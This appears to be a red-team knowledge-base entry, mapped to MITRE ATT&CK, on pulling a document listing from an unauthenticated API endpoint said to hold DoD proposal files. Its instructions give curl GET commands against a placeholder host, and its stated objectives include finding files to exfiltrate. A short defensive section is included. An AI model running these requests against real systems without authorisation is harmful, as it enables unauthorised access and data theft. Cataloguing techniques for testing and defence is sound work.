---
tags:
  - unauth-access
  - document-leak
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-get-documents-endpoint]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:01.598Z'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
id: 8858f702-22af-4151-898a-78de85e3c1a0
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Access-Document-Listing-Endpoint-Without-Authentication

## Summary

This procedure demonstrates making an unauthenticated GET request to retrieve a listing of sensitive documents stored in the API potentially exposing DoD proposal files.

## Description

Targeting the /api/1_0/Documents endpoint in an unprotected test API the procedure uses simple HTTP requests to list documents without any credentials. This exploits improper access control in web-based proposal systems allowing attackers to view metadata and potentially download files leading to data exfiltration. Prerequisites are knowledge of the endpoint from Swagger; outcomes include full document inventory for further manipulation or theft.

## Requirements

1. Known API base URL from reconnaissance
2. curl or similar HTTP client
3. No authentication tokens required

## Defense

Defensive measures and detection strategies:

- Enforce JWT or API key authentication on all storage endpoints
- Log and alert on unauthenticated GET requests to sensitive paths
- Implement rate limiting and IP restrictions on API access

## Objectives

1. Retrieve unauthorized list of stored documents
2. Identify sensitive DoD files for exfiltration
3. Assess potential for upload/modify/delete operations

## Instructions

### Step 1: Send Unauthenticated GET Request

**Context**: Query the documents endpoint to fetch the listing.

**Command** ([[commands/curl-get-documents-endpoint]]):
```bash
curl -X GET "https://target/api/1_0/Documents" -H "Accept: application/json"
```

> This returns a JSON array of documents. Expected output: {"documents": [{"id":1,"name":"proposal.pdf",...}]} indicating success.

### Step 2: Parse and Validate Response

**Context**: Review the output for sensitive content.

Use jq for parsing if available:
```bash
curl -X GET "https://target/api/1_0/Documents" | jq "."
```

> Expected output: Structured JSON showing document details confirming exposure.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-get-documents-endpoint]]

## Tools Used

- [[tools/curl]]

## Tags

- [[unauth-access]]
- [[document-leak]]
